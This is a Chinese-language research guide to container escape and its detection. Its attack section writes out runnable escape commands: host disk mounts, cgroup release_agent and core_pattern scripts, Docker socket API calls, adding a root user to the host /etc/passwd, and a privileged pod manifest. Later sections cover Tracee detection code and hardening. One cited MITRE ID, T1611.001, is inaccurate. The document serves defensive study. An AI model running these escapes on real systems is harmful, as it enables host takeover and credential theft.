# 容器逃逸技术调研文档

> 文档版本：1.0
> 创建日期：2026-02-03
> 作者：Security Research Team

---

## 目录

1. [概述](#1-概述)
2. [容器逃逸攻击手法](#2-容器逃逸攻击手法)
3. [容器逃逸检测方法](#3-容器逃逸检测方法)
4. [Tracee检测实现分析](#4-tracee检测实现分析)
5. [容器安全配置](#5-容器安全配置)
6. [检测策略与配置](#6-检测策略与配置)
7. [总结与建议](#7-总结与建议)
8. [参考资料](#8-参考资料)

---

## 1. 概述

### 1.1 什么是容器逃逸

容器逃逸（Container Escape）是指攻击者突破容器的隔离边界，获得宿主机访问权限或影响其他容器的攻击技术。由于容器与宿主机共享内核，容器逃逸是云原生环境中最严重的安全威胁之一。

**容器逃逸的危害**：
- 获取宿主机 root 权限
- 访问宿主机上的敏感数据
- 横向移动到其他容器
- 控制整个 Kubernetes 集群
- 数据泄露和持久化后门

### 1.2 容器隔离机制

理解容器逃逸需要首先了解 Linux 容器的隔离机制：

**Linux Namespaces**：
| Namespace | 隔离内容 | 系统调用标志 |
|-----------|----------|--------------|
| Mount (mnt) | 文件系统挂载点 | CLONE_NEWNS |
| UTS | 主机名和域名 | CLONE_NEWUTS |
| IPC | 进程间通信 | CLONE_NEWIPC |
| PID | 进程ID | CLONE_NEWPID |
| Network (net) | 网络设备、端口 | CLONE_NEWNET |
| User | 用户和组ID | CLONE_NEWUSER |
| Cgroup | Cgroup根目录 | CLONE_NEWCGROUP |
| Time | 系统时间（5.6+） | CLONE_NEWTIME |

**Control Groups (cgroups)**：
- 资源限制（CPU、内存、IO）
- 优先级控制
- 资源统计
- 进程控制

**Linux Capabilities**：
- 将 root 权限细分为 40+ 个独立能力
- 容器默认删除大部分危险 Capabilities
- `--privileged` 会授予所有 Capabilities

**Seccomp**：
- 系统调用过滤
- Docker 默认阻止约 44 个危险系统调用
- 包括：`mount`、`ptrace`、`reboot` 等

### 1.3 MITRE ATT&CK 框架分类

容器逃逸在 MITRE ATT&CK 框架中的主要分类：

| 技术 ID | 技术名称 | 描述 |
|---------|---------|------|
| T1611 | Escape to Host | 从容器逃逸到宿主机 |
| T1610 | Deploy Container | 部署恶意容器 |
| T1068 | Exploitation for Privilege Escalation | 利用漏洞提权 |
| T1611.001 | Privileged Container | 利用特权容器逃逸 |

---

## 2. 容器逃逸攻击手法

### 2.1 特权容器逃逸

**原理**：
`--privileged` 标志赋予容器几乎与宿主机相同的权限，包括所有 Capabilities、设备访问权限和关闭 seccomp 过滤。

**攻击条件**：
- 容器以 `--privileged` 模式运行
- 或具有 `CAP_SYS_ADMIN` 等危险 Capabilities

**利用方式 1：挂载宿主机文件系统**
```bash
# 列出宿主机设备
fdisk -l

# 挂载宿主机根分区
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 获取宿主机访问
chroot /mnt/host /bin/bash

# 或直接读取敏感文件
cat /mnt/host/etc/shadow
```

**利用方式 2：通过 /proc 逃逸**
```bash
# 获取宿主机 PID 1 的根目录
ls -la /proc/1/root/

# 读取宿主机文件
cat /proc/1/root/etc/shadow
```

**利用方式 3：debugfs 逃逸**
```bash
# 使用 debugfs 直接访问磁盘
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

**MITRE ATT&CK ID**：T1611.001

### 2.2 Cgroup Release Agent 逃逸

**原理**：
Cgroup v1 的 `release_agent` 机制允许在 cgroup 内最后一个进程退出时执行指定的程序。攻击者可以利用此机制在宿主机上执行任意命令。

**攻击条件**：
- 容器内可以挂载 cgroup 文件系统
- 具有 `CAP_SYS_ADMIN` 能力
- 或 cgroup namespace 未隔离

**攻击步骤**：
```bash
# Step 1: 挂载 cgroup 并创建子 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Step 2: 启用 notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# Step 3: 获取宿主机路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 4: 设置 release_agent 指向恶意脚本
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 5: 创建恶意脚本
cat > /cmd << EOF
#!/bin/sh
cat /etc/shadow > $host_path/output
EOF
chmod +x /cmd

# Step 6: 触发逃逸 - 将进程加入 cgroup 后立即退出
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Step 7: 读取输出
cat /output
```

**执行流程**：
```
容器内进程 → 加入 cgroup → 退出 → 触发 notify_on_release
                                        ↓
                              宿主机执行 release_agent
                                        ↓
                              恶意脚本以 root 权限执行
```

**MITRE ATT&CK ID**：T1611

### 2.3 Docker Socket 逃逸

**原理**：
Docker Socket (`/var/run/docker.sock`) 是 Docker 守护进程的 Unix Socket API 入口。如果容器内能访问此 socket，攻击者可以调用 Docker API 创建特权容器实现逃逸。

**攻击条件**：
- 容器内挂载了 `/var/run/docker.sock`
- 具有访问该 socket 的权限

**常见暴露场景**：
```yaml
# Docker Compose
volumes:
  - /var/run/docker.sock:/var/run/docker.sock

# Kubernetes
volumeMounts:
  - name: docker-sock
    mountPath: /var/run/docker.sock
```

**攻击步骤**：
```bash
# 方式 1: 使用 docker CLI（如果容器内有）
docker run -it --privileged --pid=host --net=host \
    -v /:/host ubuntu chroot /host

# 方式 2: 使用 curl 调用 API
# 创建特权容器
curl -X POST -H "Content-Type: application/json" \
    --unix-socket /var/run/docker.sock \
    -d '{
        "Image": "ubuntu",
        "Cmd": ["/bin/bash", "-c", "cat /host/etc/shadow"],
        "HostConfig": {
            "Privileged": true,
            "Binds": ["/:/host"]
        }
    }' \
    http://localhost/containers/create?name=escape

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
    http://localhost/containers/escape/start

# 获取输出
curl --unix-socket /var/run/docker.sock \
    http://localhost/containers/escape/logs?stdout=true
```

**MITRE ATT&CK ID**：T1068

### 2.4 设备文件挂载逃逸

**原理**：
容器挂载了宿主机的块设备（如 `/dev/sda`）或敏感目录，可直接访问宿主机文件系统。

**攻击条件**：
- 容器内挂载了宿主机设备或敏感目录
- 具有相应的访问权限

**危险挂载示例**：
```bash
# 块设备挂载
docker run -v /dev/sda:/dev/sda ...

# 敏感目录挂载
docker run -v /:/host ...
docker run -v /etc:/host/etc ...
docker run -v /root:/host/root ...
```

**利用方式**：
```bash
# 直接挂载设备
mount /dev/sda1 /mnt
cat /mnt/etc/shadow

# 或使用已挂载的主机目录
cat /host/etc/shadow
echo "attacker:x:0:0::/root:/bin/bash" >> /host/etc/passwd
```

**MITRE ATT&CK ID**：T1611

### 2.5 内核漏洞逃逸

**原理**：
利用 Linux 内核漏洞直接突破容器隔离，获得宿主机权限。由于容器与宿主机共享内核，内核漏洞是最危险的逃逸途径。

**著名漏洞**：

| 漏洞 | CVE | 影响版本 | 类型 |
|------|-----|---------|------|
| Dirty COW | CVE-2016-5195 | 2.x - 4.8.x | 竞态条件 |
| Dirty Pipe | CVE-2022-0847 | 5.8 - 5.16.10 | 管道缓冲区覆写 |
| runc 漏洞 | CVE-2019-5736 | runc < 1.0-rc6 | /proc/self/exe 覆写 |
| containerd 漏洞 | CVE-2020-15257 | containerd < 1.3.9 | 抽象 Socket 逃逸 |
| OverlayFS | CVE-2023-0386 | 5.11 - 6.2 | 权限绕过 |
| nftables | CVE-2023-32233 | 5.x - 6.x | UAF |

**CVE-2019-5736 (runc 逃逸)**：
```bash
# 攻击者在容器内覆写宿主机的 runc 二进制
# 当管理员再次执行 docker exec 时，触发恶意代码

# 容器内准备
#!/bin/bash
# 利用 /proc/self/exe 获取 runc 路径
# 覆写 runc 为恶意程序
```

**MITRE ATT&CK ID**：T1068

### 2.6 Procfs 逃逸

**原理**：
利用 `/proc` 文件系统中的某些文件进行逃逸，如 `/proc/sys/kernel/core_pattern`。

**core_pattern 逃逸**：
```bash
# 需要 CAP_SYS_ADMIN

# 获取容器在宿主机上的路径
container_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 创建恶意脚本
cat > /evil.sh << EOF
#!/bin/bash
cat /etc/shadow > /tmp/pwned
EOF
chmod +x /evil.sh

# 修改 core_pattern 指向恶意脚本
echo "|$container_path/evil.sh" > /proc/sys/kernel/core_pattern

# 触发 core dump
sleep 100 &
kill -SIGSEGV $!

# 读取结果
cat /tmp/pwned
```

**release_agent vs core_pattern**：
| 特性 | release_agent | core_pattern |
|------|---------------|--------------|
| 触发方式 | cgroup 释放 | 进程崩溃 |
| 所需权限 | CAP_SYS_ADMIN | CAP_SYS_ADMIN |
| Cgroup 版本 | v1 only | 不限 |
| 检测难度 | 中 | 中 |

**MITRE ATT&CK ID**：T1611

### 2.7 Namespace 逃逸

**原理**：
通过 `nsenter` 或 `setns` 系统调用进入宿主机或其他容器的 namespace。

**攻击条件**：
- 具有 `CAP_SYS_ADMIN` 或 `CAP_SYS_PTRACE`
- 可以访问宿主机进程的 namespace 文件

**利用方式**：
```bash
# 通过 nsenter 进入 PID 1 的所有 namespace
nsenter -t 1 -m -u -n -i -p /bin/bash

# 或通过 setns 系统调用
# 打开 /proc/1/ns/mnt 并调用 setns()
```

**MITRE ATT&CK ID**：T1611

### 2.8 eBPF 逃逸

**原理**：
利用 eBPF 程序加载能力，在内核态执行代码实现逃逸。

**攻击条件**：
- 具有 `CAP_BPF` 或 `CAP_SYS_ADMIN`
- 内核启用 unprivileged BPF（已默认禁用）

**利用方式**：
- 利用 eBPF 漏洞获得任意内核读写
- 修改进程凭证结构
- 关闭安全检查

**MITRE ATT&CK ID**：T1068

### 2.9 Kubernetes 特定逃逸

**Service Account Token 滥用**：
```bash
# 读取 Service Account Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 使用 Token 访问 API Server
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

**特权 Pod 创建**：
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

**MITRE ATT&CK ID**：T1610, T1611

### 2.10 容器逃逸攻击总结

| 攻击类型 | 所需权限 | 难度 | 危害 |
|----------|----------|------|------|
| 特权容器 | --privileged | 低 | 极高 |
| Cgroup release_agent | CAP_SYS_ADMIN | 中 | 极高 |
| Docker Socket | Socket 访问权 | 低 | 极高 |
| 设备挂载 | 设备访问权 | 低 | 高 |
| 内核漏洞 | 无��取决于漏洞） | 高 | 极高 |
| Procfs 逃逸 | CAP_SYS_ADMIN | 中 | 高 |
| Namespace 逃逸 | CAP_SYS_ADMIN | 中 | 高 |
| eBPF 逃逸 | CAP_BPF | 高 | 极高 |

---

## 3. 容器逃逸检测方法

### 3.1 检测架构

```
┌─────────────────────────────────────────────────────────┐
│                    检测层次架构                          │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │          编排层检测 (Kubernetes)                  │   │
│  │  - AdmissionController                          │   │
│  │  - Pod Security Policy/Standards                │   │
│  │  - OPA/Gatekeeper                               │   │
│  └─────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │          容器运行时检测                           │   │
│  │  - Docker/containerd 事件                       │   │
│  │  - 容器配置审计                                  │   │
│  └─────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │          系统调用层检测                           │   │
│  │  - eBPF (Tracee, Falco, Tetragon)              │   │
│  │  - Seccomp                                      │   │
│  │  - LSM (SELinux, AppArmor)                     │   │
│  └─────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │          内核层检测                               │   │
│  │  - 内核函数 hook                                 │   │
│  │  - 数据结构监控                                  │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

### 3.2 关键检测点

**文件系统监控**：
| 检测目标 | 文件/路径 | 检测方式 |
|----------|-----------|----------|
| Cgroup 逃逸 | `/sys/fs/cgroup/**/release_agent` | 写操作监控 |
| Cgroup 逃逸 | `/sys/fs/cgroup/**/notify_on_release` | 写操作监控 |
| Docker Socket | `/var/run/docker.sock` | 访问监控 |
| Procfs 逃逸 | `/proc/sys/kernel/core_pattern` | 写操作监控 |
| 凭证访问 | `/var/run/secrets/kubernetes.io/*` | 读操作监控 |

**系统调用监控**：
| 系统调用 | 监控目的 |
|----------|----------|
| mount | 设备/文件系统挂载 |
| setns | Namespace 切换 |
| unshare | Namespace 解离 |
| ptrace | 进程调试/注入 |
| bpf | eBPF 程序加载 |
| init_module | 内核模块加载 |

**进程行为监控**：
| 行为 | 检测方式 |
|------|----------|
| nsenter 执行 | execve 监控 |
| docker/kubectl 执行 | execve 监控 |
| 异常子进程创建 | 进程树分析 |
| 敏感文件访问 | 文件操作监控 |

### 3.3 LSM Hook 检测点

**关键 LSM Hook**：
```c
// 文件操作
security_file_open()        // 文件打开
security_inode_rename()     // 文件重命名

// 挂载操作
security_sb_mount()         // 文件系统挂载
security_sb_umount()        // 文件系统卸载

// Socket 操作
security_socket_connect()   // Socket 连接

// Capability 检查
security_capable()          // 能力检查

// 进程操作
security_task_setpgid()     // 设置进程组
security_task_setuid()      // 设置 UID
```

### 3.4 行为基线检测

**正常行为基线**：
- 容器内不应访问 cgroup 控制文件
- 容器内不应挂载宿主机设备
- 容器内不应访问 Docker Socket
- 容器内不应执行 nsenter/unshare

**异常行为指标**：
```yaml
# 高危行为
- cgroup release_agent 修改
- notify_on_release 修改
- /dev/sda* 挂载
- docker.sock 访问

# 中危行为
- /proc/sys/* 修改
- 高危 Capability 使用
- 异常网络连接

# 低危行为
- 敏感文件读取
- 异常进程创建
```

---

## 4. Tracee检测实现分析

### 4.1 Tracee 容器检测架构

```
┌────────────────────────────────────────────────────────────┐
│                    Tracee 容器检测架构                       │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ┌──────────────────────────────────────────────────────┐ │
│  │                   用户空间                            │ │
│  │  ┌───────────┐  ┌───────────┐  ┌────────────────┐   │ │
│  │  │ 容器管理器 │  │  签名引擎  │  │  运行时适配器  │   │ │
│  │  │ containers│  │ signatures│  │ docker/cri-o  │   │ │
│  │  └─────┬─────┘  └─────┬─────┘  └───────┬────────┘   │ │
│  │        │              │                │            │ │
│  │  ┌─────┴──────────────┴────────────────┴──────────┐ │ │
│  │  │              事件处理管道                        │ │ │
│  │  └─────────────────────┬──────────────────────────┘ │ │
│  └────────────────────────┼────────────────────────────┘ │
│                           │                              │
│  ┌────────────────────────┼────────────────────────────┐ │
│  │           内核空间      │                            │ │
│  │  ┌─────────────────────┴──────────────────────────┐ │ │
│  │  │                 eBPF 程序                       │ │ │
│  │  │  ┌─────────────────────────────────────────┐   │ │ │
│  │  │  │ Kprobes: security_file_open            │   │ │ │
│  │  │  │          security_sb_mount             │   │ │ │
│  │  │  │          security_socket_connect       │   │ │ │
│  │  │  │          security_inode_rename         │   │ │ │
│  │  │  └─────────────────────────────────────────┘   │ │ │
│  │  │  ┌─────────────────────────────────────────┐   │ │ │
│  │  │  │ BPF Maps: container_map                │   │ │ │
│  │  │  │           cgroup_map                   │   │ │ │
│  │  │  └─────────────────────────────────────────┘   │ │ │
│  │  └────────────────────────────────────────────────┘ │ │
│  └─────────────────────────────────────────────────────┘ │
└──────────────────────────��─────────────────────────────────┘
```

### 4.2 容器逃逸相关签名规则

Tracee 实现了多个容器逃逸检测签名：

| 签名 ID | 名称 | 事件源 | MITRE ATT&CK |
|---------|------|--------|--------------|
| TRC-1010 | cgroup_release_agent | security_file_open, security_inode_rename | T1611 |
| TRC-106 | cgroup_notify_on_release | security_file_open | T1611 |
| TRC-1019 | docker_abuse | security_file_open, security_socket_connect | T1068 |
| TRC-1014 | disk_mount | security_sb_mount | T1611 |
| TRC-1021 | proc_kcore_read | security_file_open | T1611 |

### 4.3 Cgroup Release Agent 检测实现

**签名代码**（`signatures/golang/cgroup_release_agent_modification.go`）：

```go
type CgroupReleaseAgentModification struct {
    cb               detect.SignatureHandler
    releaseAgentName string  // "release_agent"
}

func (sig *CgroupReleaseAgentModification) GetMetadata() (detect.SignatureMetadata, error) {
    return detect.SignatureMetadata{
        ID:          "TRC-1010",
        Version:     "1",
        Name:        "Cgroups release agent file modification",
        EventName:   "cgroup_release_agent",
        Description: "An attempt to modify Cgroup release agent file was detected...",
        Properties: map[string]interface{}{
            "Severity":    3,
            "Category":    "privilege-escalation",
            "Technique":   "Escape to Host",
            "external_id": "T1611",
        },
    }, nil
}

func (sig *CgroupReleaseAgentModification) GetSelectedEvents() ([]detect.SignatureEventSelector, error) {
    return []detect.SignatureEventSelector{
        {Source: "tracee", Name: "security_file_open", Origin: "container"},
        {Source: "tracee", Name: "security_inode_rename", Origin: "container"},
    }, nil
}

func (sig *CgroupReleaseAgentModification) OnEvent(event protocol.Event) error {
    eventObj := event.Payload.(trace.Event)
    basename := ""

    switch eventObj.EventName {
    case "security_file_open":
        flags, _ := eventObj.GetIntArgumentByName("flags")
        if parsers.IsFileWrite(flags) {
            pathname, _ := eventObj.GetStringArgumentByName("pathname")
            basename = path.Base(pathname)
        }
    case "security_inode_rename":
        newPath, _ := eventObj.GetStringArgumentByName("new_path")
        basename = path.Base(newPath)
    }

    // 检测 release_agent 文件修改
    if basename == sig.releaseAgentName {
        sig.cb(&detect.Finding{
            SigMetadata: metadata,
            Event:       event,
        })
    }
    return nil
}
```

**检测逻辑分析**：
1. 监听 `security_file_open` 和 `security_inode_rename` 事件
2. 只处理来自容器的事件（`Origin: "container"`）
3. 对于文件打开，检查是否为写操作
4. 提取文件基名，判断是否为 `release_agent`
5. 匹配则触发告警

### 4.4 Docker Socket 滥用检测实现

**签名代码**（`signatures/golang/docker_abuse.go`）：

```go
type DockerAbuse struct {
    cb         detect.SignatureHandler
    dockerSock string  // "docker.sock"
}

func (sig *DockerAbuse) GetSelectedEvents() ([]detect.SignatureEventSelector, error) {
    return []detect.SignatureEventSelector{
        {Source: "tracee", Name: "security_file_open", Origin: "container"},
        {Source: "tracee", Name: "security_socket_connect", Origin: "container"},
    }, nil
}

func (sig *DockerAbuse) OnEvent(event protocol.Event) error {
    eventObj := event.Payload.(trace.Event)
    path := ""

    switch eventObj.EventName {
    case "security_file_open":
        pathname, _ := eventObj.GetStringArgumentByName("pathname")
        flags, _ := eventObj.GetIntArgumentByName("flags")
        // 只检测写操作
        if parsers.IsFileWrite(flags) {
            path = pathname
        }

    case "security_socket_connect":
        addr, _ := eventObj.GetRawAddrArgumentByName("remote_addr")
        // 检查是否为 Unix Socket
        if supportedFamily, _ := parsers.IsUnixFamily(addr); supportedFamily {
            sunPath, _ := parsers.GetPathFromRawAddr(addr)
            path = sunPath
        }
    }

    // 检测 docker.sock 访问
    if strings.HasSuffix(path, sig.dockerSock) {
        sig.cb(&detect.Finding{...})
    }
    return nil
}
```

**检测逻辑分析**：
1. 监听文件打开和 Socket 连接事件
2. 对于文件打开，只检测写操作
3. 对于 Socket 连接，提取 Unix Socket 路径
4. 检查路径是否以 `docker.sock` 结尾
5. 匹配则触发告警

### 4.5 设备挂载检测实现

**签名代码**（`signatures/golang/disk_mount.go`）：

```go
type DiskMount struct {
    cb     detect.SignatureHandler
    devDir string  // "/dev/"
}

func (sig *DiskMount) GetSelectedEvents() ([]detect.SignatureEventSelector, error) {
    return []detect.SignatureEventSelector{
        {Source: "tracee", Name: "security_sb_mount", Origin: "container"},
    }, nil
}

func (sig *DiskMount) OnEvent(event protocol.Event) error {
    eventObj := event.Payload.(trace.Event)

    switch eventObj.EventName {
    case "security_sb_mount":
        // 确保容器已启动（排除容器启动阶段的挂载）
        if !eventObj.ContextFlags.ContainerStarted {
            return nil
        }

        deviceName, _ := eventObj.GetStringArgumentByName("dev_name")

        // 检测 /dev/* 设备挂载
        if strings.HasPrefix(deviceName, sig.devDir) {
            sig.cb(&detect.Finding{...})
        }
    }
    return nil
}
```

**检测逻辑分析**：
1. 监听 `security_sb_mount` 事件
2. 只处理容器启动后的挂载操作
3. 检查设备名是否以 `/dev/` 开头
4. 匹配则触发告警（容器内挂载宿主机设备）

### 4.6 容器信息管理

**容器管理器**（`pkg/containers/containers.go`）：

```go
type Container struct {
    ContainerId string           // 64位十六进制容器ID
    CreatedAt   time.Time        // 创建时间
    Runtime     runtime.RuntimeId // 运行时类型 (docker/containerd/cri-o)
    Name        string           // 容器名称
    Image       string           // 镜像名称
    ImageDigest string           // 镜像摘要
    Pod         Pod              // Kubernetes Pod 信息
}

type Manager struct {
    cgroups      *cgroup.Cgroups
    cgroupsMap   map[uint32]CgroupDir    // cgroup ID -> 目录信息
    containerMap map[string]Container    // 容器ID -> 容器信息
    enricher     runtime.Service         // 运行时查询服务
}
```

**支持的容器运行时路径模式**：
```go
// Docker (systemd)
/system.slice/docker-<id>.scope

// Docker (non-systemd)
/docker/<id>

// containerd (K8s)
/kubepods/besteffort/pod<id>/<container-id>

// CRI-O
/crio-<id>.scope

// Podman
/libpod-<id>.scope
```

### 4.7 事件处理流程

```
1. eBPF 捕获内核事件
   ├── security_file_open
   ├── security_sb_mount
   ├── security_socket_connect
   └── security_inode_rename

2. 事件上下文增强
   ├── 关联容器ID
   ├── 关联 Cgroup 信息
   └── 添加时间戳

3. 事件传递到签名引擎
   ├── 遍历所有签名
   ├── 检查事件类型匹配
   └── 检查 Origin (container/host)

4. 签名检测
   ├── CgroupReleaseAgentModification.OnEvent()
   ├── DockerAbuse.OnEvent()
   └── DiskMount.OnEvent()

5. 触发告警
   └── Finding {
         SigMetadata: {...},
         Event: {...}
       }
```

---

## 5. 容器安全配置

### 5.1 最小权限原则

**删除危险 Capabilities**：
```bash
# 推荐配置
docker run --cap-drop=ALL \
    --cap-add=NET_BIND_SERVICE \
    --cap-add=CHOWN \
    myimage

# Kubernetes
securityContext:
  capabilities:
    drop:
      - ALL
    add:
      - NET_BIND_SERVICE
```

**避免特权容器**：
```yaml
# 永远不要在生产环境使用
# privileged: true  ❌

securityContext:
  privileged: false
  allowPrivilegeEscalation: false
```

### 5.2 Seccomp 配置

**使用 Seccomp 配置文件**：
```json
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64"],
    "syscalls": [
        {
            "names": ["read", "write", "exit", "exit_group"],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
```

```bash
docker run --security-opt seccomp=/path/to/seccomp.json myimage
```

### 5.3 只读文件系统

```yaml
# Kubernetes
securityContext:
  readOnlyRootFilesystem: true

volumeMounts:
  - name: tmp
    mountPath: /tmp
volumes:
  - name: tmp
    emptyDir: {}
```

### 5.4 网络隔离

```yaml
# Network Policy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

### 5.5 运行时保护

**启用用户命名空间**：
```bash
# Docker
dockerd --userns-remap=default

# containerd
[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
  UsernsMode = "private"
```

**使用 gVisor/Kata Containers**：
```yaml
# RuntimeClass
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
---
spec:
  runtimeClassName: gvisor
```

---

## 6. 检测策略与配置

### 6.1 Tracee 容器逃逸检测策略

```yaml
apiVersion: tracee.aquasecurity.github.io/v1beta1
kind: Policy
metadata:
  name: container-escape-detection
  annotations:
    description: 容器逃逸综合检测策略
spec:
  scope:
    - container=true

  rules:
    # 1. Cgroup 逃逸检测
    - event: security_file_open
      filters:
        - data.pathname=**/release_agent
        - data.pathname=**/notify_on_release

    - event: security_inode_rename
      filters:
        - data.new_path=**/release_agent

    # 2. Docker Socket 滥用
    - event: security_file_open
      filters:
        - data.pathname=**/docker.sock

    - event: security_socket_connect
      filters:
        - data.remote_addr=**/docker.sock

    # 3. 设备挂载
    - event: security_sb_mount
      filters:
        - data.dev_name=/dev/*

    # 4. Procfs 逃逸
    - event: security_file_open
      filters:
        - data.pathname=/proc/sys/kernel/core_pattern
        - data.pathname=/proc/kcore

    # 5. Namespace 操作
    - event: sched_process_exec
      filters:
        - data.pathname=/usr/bin/nsenter
        - data.pathname=/usr/bin/unshare

    # 6. 高危 Capability 使用
    - event: cap_capable
      filters:
        - data.cap=CAP_SYS_ADMIN
        - data.cap=CAP_SYS_MODULE
        - data.cap=CAP_SYS_PTRACE
```

### 6.2 签名事件启用

```yaml
# 启用所有容器逃逸相关签名
apiVersion: tracee.aquasecurity.github.io/v1beta1
kind: Policy
metadata:
  name: escape-signatures
spec:
  rules:
    - event: cgroup_release_agent        # TRC-1010
    - event: cgroup_notify_on_release    # TRC-106
    - event: docker_abuse                # TRC-1019
    - event: disk_mount                  # TRC-1014
    - event: proc_kcore_read             # TRC-1021
    - event: kernel_module_loading       # TRC-1017
```

### 6.3 Kubernetes Admission 控制

**OPA/Gatekeeper 策略**：
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: deny-privileged
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    exemptImages: []
---
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: k8spspprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sPSPPrivilegedContainer
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8spspprivileged
        violation[{"msg": msg}] {
          c := input.review.object.spec.containers[_]
          c.securityContext.privileged
          msg := "Privileged container is not allowed"
        }
```

### 6.4 告警配置

```yaml
# 输出到 SIEM/SOAR
apiVersion: tracee.aquasecurity.github.io/v1beta1
kind: TraceeConfig
spec:
  output:
    - webhook:
        url: https://siem.company.com/api/events
        headers:
          X-API-Key: <key>

    - syslog:
        address: syslog.company.com:514
        protocol: tcp
        format: rfc5424
```

---

## 7. 总结与建议

### 7.1 容器逃逸攻击总结

**攻击面分析**：
```
                    容器逃逸攻击面
                         │
        ┌────────────────┼────────────────┐
        │                │                │
    配置错误          运行时漏洞        内核漏洞
        │                │                │
  ┌─────┴─────┐    ┌─────┴─────┐    ┌─────┴─────┐
  │特权容器   │    │runc漏洞   │    │Dirty Pipe │
  │Docker Sock│    │containerd │    │OverlayFS  │
  │敏感挂载   │    │漏洞       │    │nftables   │
  └───────────┘    └───────────┘    └───────────┘
```

**关键风险点**：
1. **特权容器**：最常见且最危险的配置错误
2. **Docker Socket**：暴露导致完全控制
3. **Cgroup 逃逸**：利用 release_agent 机制
4. **内核漏洞**：共享内核带来的固有风险

### 7.2 检测能力评估

| 检测方法 | 覆盖范围 | 实时性 | 误报率 |
|----------|----------|--------|--------|
| Tracee (eBPF) | 高 | 高 | 低 |
| Admission Controller | 中 | 高 | 极低 |
| 运行时审计 | 中 | 中 | 中 |
| 镜像扫描 | 低 | 低 | 低 |

### 7.3 防护建议

**纵深防御策略**：

```
┌─────────────────────────────────────────────────────────┐
│                    第一层：预防                          │
│  - 镜像安全扫描                                         │
│  - Admission Controller                                 │
│  - Pod Security Standards                               │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│                    第二层：限制                          │
│  - 最小权限 Capabilities                                │
│  - Seccomp/AppArmor                                     │
│  - 只读文件系统                                         │
│  - 网络策略隔离                                         │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│                    第三层：检测                          │
│  - Tracee/Falco 运行时检测                              │
│  - 异常行为监控                                         │
│  - 审计日志                                             │
└─────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────┐
│                    第四层：响应                          │
│  - 自动化告警                                           │
│  - 容器隔离/终止                                        │
│  - 取证分析                                             │
└─────────────────────────────────────────────────────────┘
```

**最佳实践清单**：

- [ ] 禁止特权容器
- [ ] 禁止挂载 Docker Socket
- [ ] 删除所有不必要的 Capabilities
- [ ] 启用 Seccomp 默认配置
- [ ] 使用只读根文件系统
- [ ] 启用用户命名空间
- [ ] 部署运行时安全监控
- [ ] 配置网络策略
- [ ] 定期更新内核和运行时
- [ ] 实施镜像签名验证

### 7.4 Tracee 部署建议

1. **基础监控**：启用所有容器逃逸相关签名
2. **策略优化**：根据环境调整检测范围
3. **告警集成**：对接 SIEM/SOAR 系统
4. **持续调优**：根据误报反馈调整规则
5. **响应自动化**：配置自动隔离/终止策略

---

## 8. 动手实验

> 理论学完了，现在动手实践！

详细的攻击复现和检测实验，请参考：

👉 **[实验三：容器逃逸攻击与检测](lab-03-container-escape.md)**

实验内容包括：
- 特权容器逃逸复现
- Cgroup Release Agent 逃逸复现
- Docker Socket 逃逸复现
- Tracee 检测验证

---

## 9. 参考资料

### 9.1 官方文档
- [Tracee Documentation](https://aquasecurity.github.io/tracee/)
- [Docker Security](https://docs.docker.com/engine/security/)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
- [MITRE ATT&CK - Containers](https://attack.mitre.org/matrices/enterprise/containers/)

### 9.2 关键代码文件

| 文件 | 说明 |
|------|------|
| `signatures/golang/cgroup_release_agent_modification.go` | Cgroup release agent 检测 |
| `signatures/golang/cgroup_notify_on_release_modification.go` | notify_on_release 检测 |
| `signatures/golang/docker_abuse.go` | Docker Socket 滥用检测 |
| `signatures/golang/disk_mount.go` | 设备挂载检测 |
| `pkg/containers/containers.go` | 容器管理器 |
| `pkg/containers/runtime/` | 运行时适配器 |

### 9.3 扩展阅读
